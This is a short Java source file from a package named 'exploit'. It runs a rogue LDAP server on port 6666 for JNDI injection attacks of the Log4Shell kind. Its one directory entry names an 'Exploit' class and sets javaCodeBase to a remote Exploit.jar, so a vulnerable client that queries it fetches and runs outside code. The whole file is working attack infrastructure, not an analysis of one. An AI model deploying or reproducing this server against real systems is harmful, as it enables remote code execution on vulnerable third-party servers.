package me.func.exploit;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.*;

import java.util.concurrent.locks.LockSupport;

public class LdapServer implements Server {
	@Override
	public void run() {
		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("");
			config.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("default", 6666));
			config.setSchema(null);

			try (InMemoryDirectoryServer server = new InMemoryDirectoryServer(config)) {
				Entry entry = new Entry("");
				entry.addAttribute("javaClassName", "Exploit");
				entry.addAttribute("javaSerializedData", "hz");
				entry.addAttribute("javaCodeBase", "https://raw.githubusercontent.com/oleksandrkyetov/log4j-boilerplate/master/Exploit.jar");
				server.addEntries(entry);

				server.startListening();

				LockSupport.park();
			}
		} catch (LDAPException e) {
			throw new RuntimeException(e);
		}
	}
}
